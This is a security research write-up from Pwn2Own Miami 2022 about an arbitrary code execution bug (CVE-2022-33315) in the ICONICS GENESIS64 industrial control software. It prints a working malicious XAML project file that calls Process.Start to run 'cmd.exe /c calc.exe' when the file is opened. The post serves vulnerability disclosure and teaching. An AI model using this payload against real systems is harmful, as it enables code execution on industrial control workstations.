---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-17_pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution.md
original_filename: 2022-10-17_pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution.md
title: 'Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution'
category: documents
detected_topics:
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: 6204417e8508d8ff0fde7c9f84cf22a282e9bed3d2eb166b184da4970e98f7c8
text_sha256: 9af87f0eb0a599321b6101ed401cc1f3cc984a9274296fad4a561184af48e325
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-17_pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `6204417e8508d8ff0fde7c9f84cf22a282e9bed3d2eb166b184da4970e98f7c8`
- Text SHA256: `9af87f0eb0a599321b6101ed401cc1f3cc984a9274296fad4a561184af48e325`


## Content

---
title: "Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution"
page_title: "Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution | DEFION Research Labs"
url: "https://sector7.computest.nl/post/2022-10-iconics-genesis64/"
final_url: "https://defion.security/en/research-labs/pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution/"
authors: ["Sector 7 (@sector7_nl)"]
programs: ["ICONICS"]
bugs: ["RCE"]
bounty: "5,000"
publication_date: "2022-10-17"
added_date: "2022-10-17"
source: "pentester.land/writeups.json"
original_index: 2033
---

[Home](/en/) › [Research Labs](/en/research-labs/) › Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution

Pwn2Own 17 October 2022 · 4 min read

# Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution

This write-up is part 5 of a series of write-ups about the 5 vulnerabilities we demonstrated last April at Pwn2Own Miami. This is the write-up for an Arbitrary Code Execution vulnerability in ICONICS GENESIS64 (CVE-2022-33315).

We successfully demonstrated this vulnerability during the competition, however it turned out that the vendor was already aware of this vulnerability. As this was also one of the most shallow bugs we used during the competition, this was something we already anticipated. The bug was originally reported by Zymo Security and disclosed as [https://www.zerodayinitiative.com/advisories/ZDI-22-1043/](ZDI-22-1043). Luckily, this was the only bug collision we had during this competition.

> [](https://twitter.com/thezdi/status/1516539530165329928)

GENESIS64 was one of the two targets in the Control Server category. It is more of a software suite than a single application and can be used to design and visualize entire ICS environments. From dashboards and control screens to visualizing entire factory floors in 3D.

## Save files

For this category it was acceptable to achieve code execution by opening a file within the target on the contest laptop. The files must be file types that are handled by default by the target application. So we opened up one of the applications that came with the GENESIS64 installer. We choose GraphWorX64 at random (it is normally used to design HMI/SCADA control screens), and saved an empty file. When looking at the empty project file, we can see it is stored as a WPF XAML file:
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <Canvas Background="#FFFFFFFF" Width="3840" Height="2320" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:iwm="clr-namespace:Ico.Windows.Media;assembly=IcoWPF" xmlns:gwx="clr-namespace:Ico.Gwx;assembly=GwxRuntimeCore">
  <Canvas.Resources>
  <BitmapImage x:Key="GwxThumbnailImageKey">
  <iwm:BitmapImageInfo.StreamSource>
  <iwm:Base64Stream Data="iVBORw0KGgoAAAANSUhEUgAAAQAAAACaCAYAAABG+Jb3AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHqSURBVHhe7dQxAQAgDMCwgX/PwIGLJk8ddJ1ngKT9CwQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAIQZAGTNXLayBTBTZS5DAAAAAElFTkSuQmCC" />
  </iwm:BitmapImageInfo.StreamSource>
  </BitmapImage>
  </Canvas.Resources>
  <gwx:GwxDocument.GwxDocument>
  <gwx:GwxDocument FileVersion="10.97.020.00" ScanRate="500" />
  </gwx:GwxDocument.GwxDocument>
  </Canvas>

Using XAML it is possible to directly instantiate objects of arbitrary types. This makes it unsuitable for loading untrusted input files. We quote a small piece of the relevant manual ([System.Windows.Markup.XamlReader](https://docs.microsoft.com/en-us/dotnet/api/system.windows.markup.xamlreader?view=windowsdesktop-6.0#code-access-security-loose-xaml-and-xamlreader)) from Microsoft regarding the loading of untrusted XAML files:

> **Code Access Security, Loose XAML, and XamlReader**
> 
> XAML is a markup language that directly represents object instantiation and execution. Therefore, elements created in XAML have the same ability to interact with system resources (network access, file system IO, for example) as the equivalent generated code does.
> 
> …
> 
> The implications of these statements for XamlReader is that your application design must make trust decisions about the XAML you decide to load. If you are loading XAML that is not trusted, consider implementing your own sandboxing technique for how you load the resulting object graph.

Unfortunately GENESIS64 has no such sandboxing technique in place, so instantiating arbitrary objects is trivial. The actual decoding of this file seems to happen in `Components/IcoWPF.dll`, using a wrapper around `XamlReader()`.

## Our exploit

In the end we used the following XAML file for instantiating a `Process` object and providing it the necessary parameters for starting our beloved calculator. This calls the method `Start` using the parameters `cmd.exe /c calc.exe`:
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <ResourceDictionary
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:System="clr-namespace:System;assembly=mscorlib"
  xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
  <ObjectDataProvider x:Key="Sector7" ObjectType="{x:Type Diag:Process}" MethodName="Start">
  <ObjectDataProvider.MethodParameters>
  <System:String>cmd.exe</System:String>
  <System:String>/c calc.exe</System:String>
  </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  <gwx:GwxDocument.GwxDocument>
  <gwx:GwxDocument FileVersion="10.97.020.00" ScanRate="500" />
  </gwx:GwxDocument.GwxDocument>
  </ResourceDictionary>

You can see the exploit in action in the screen recording below.

Your browser does not support the video tag. 

## Thoughts

To fully mitigate this vulnerability, it would be advised to use a different file format. However, this would also mean that old project files would be unable to load. ICONICS settled for a blocklist approach, with the release of version 10.97.2. In that version, the XAML file is pre-parsed before being passed to `XamlReader()` and certain classes are excluded from deserialization.

We thank Zero Day Initiative for organizing this years edition of Pwn2Own Miami, we hope to return to a later edition!

You can find the other four write-ups here:

  * [OPC UA .NET Standard Trusted Application Check Bypass](/en/research-labs/pwn2own-miami-2022-opc-ua-net-standard-trusted-application-check-bypass/)
  * [Inductive Automation Remote Code Execution](/en/research-labs/pwn2own-miami-2022-inductive-automation-ignition-remote-code-execution/)
  * [AVEVA Edge Arbitrary Code Execution](/en/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/)
  * [Unified Automation C++ Demo Server DoS](/en/research-labs/pwn2own-miami-2022-unified-automation-c-demo-server-dos/)

From our research desk to your environment

The offensive expertise behind this research is the same expertise that tests your own systems. Find the vulnerabilities that matter before attackers do. 

[Red Teaming →](/en/pentesting-services/red-teaming-service/)

[← Back to Research Labs](/en/research-labs/)
